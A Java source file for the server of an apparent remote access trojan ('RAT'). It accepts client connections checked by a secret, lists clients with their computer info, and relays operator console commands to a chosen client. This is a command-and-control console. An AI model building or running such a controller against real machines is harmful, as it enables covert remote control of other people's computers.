package main.java.rat.server;

import main.java.rat.Environment;
import main.java.rat.command.ClientCommand;
import main.java.rat.command.Command;
import main.java.rat.command.ServerCommand;
import main.java.rat.handlers.InputOutputHandler;
import main.java.rat.server.connectedClients.RATConnectedClient;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Scanner;

public class RATServer extends AbstractSocketServer implements Environment {

    private RATConnectedClient connectedClient = null;
    ArrayList<RATConnectedClient> clientList = new ArrayList<>();
    private CommandHandler commandHandler;
    private CommandHandler clientCommandsHandler;
    private int lastId = 0;

    public RATServer(int port) {
        super(port);

        commandHandler = new CommandHandler(this, ServerCommand.getAllServerCommands());
        clientCommandsHandler = new CommandHandler(this, ClientCommand.getAllClientCommands());
    }

    @Override
    void serverStarted() {
        System.out.println("Started server at port "+this.port
                +" and waiting for connections...");
        listenToConsoleCommands();
    }

    void listenToConsoleCommands() {
        Scanner console = new Scanner(System.in);


        new Thread(() -> {
            while (this.started) {
                String consoleCommand = console.nextLine();
                if(!commandHandler.commandExists(consoleCommand) && clientCommandsHandler.commandExists(consoleCommand)) {
                    if(connectedClient == null) {
                        System.out.println("Please connect to a client first to execute a client command");
                    } else {
                        connectedClient.sendCommand(consoleCommand);
                    }
                } else {
                    this.commandHandler.handleCommand(consoleCommand);
                }
            }
        }).start();

    }

    public void handleClientMessage(RATConnectedClient client, Object message) {
        System.out.println("[RATServer] received message from client: " + message.toString());
    }

    @Override
    void newConnection(Socket acceptedSocket, ObjectOutputStream outputStream, ObjectInputStream inputStream) {
        InputOutputHandler handler = new InputOutputHandler(
                acceptedSocket,
                outputStream,
                inputStream
          );
        RATConnectedClient client = new RATConnectedClient(lastId, handler, this);
        clientList.add(client);
        lastId++;
    }

    public void clientDisconnected(RATConnectedClient ratConnectedClient) {
        System.out.println("[server] client disconnected");
    }

    public void incorrectSecret(RATConnectedClient ratConnectedClient) {
        System.out.println("Client ("+ratConnectedClient.getId()+") tried to connect with incorrect secret, disconnecting the client...");
        ratConnectedClient.disconnected();
    }

    public void unknownInitError(RATConnectedClient ratConnectedClient, Exception e) {
        System.out.println("Unknown error occurred while performing init, disconnecting the client("+ratConnectedClient.getId()+")...");
        System.out.println("Exception that was produced:");
        e.printStackTrace();
        ratConnectedClient.disconnected();
    }

    public void successInit(RATConnectedClient ratConnectedClient, String version) {
        System.out.println("Client("+ratConnectedClient.getId()+") connected, computer info:");
        System.out.println(ratConnectedClient.getFormattedComputerInfo());
    }

    public RATConnectedClient getClientFromId(int id) {
        for(RATConnectedClient client : this.clientList) {
            if(client.getId() == id)
                return client;
        }

        return null;
    }

    public RATConnectedClient getConnectedClient() {
        return connectedClient;
    }

    public void setConnectedClient(RATConnectedClient connectedClient) {
        this.connectedClient = connectedClient;
    }

    public ArrayList<RATConnectedClient> getClientList() {
        return clientList;
    }

    public int getLastId() {
        return lastId;
    }

    public ArrayList<Command> getCommands() {
        ArrayList<Command> totalCommands = new ArrayList<>();
        totalCommands.addAll(commandHandler.getCommands());
        totalCommands.addAll(clientCommandsHandler.getCommands());

        return totalCommands;
    }

    @Override
    public boolean isServer() {
        return true;
    }

    @Override
    public boolean isClient() {
        return false;
    }
}
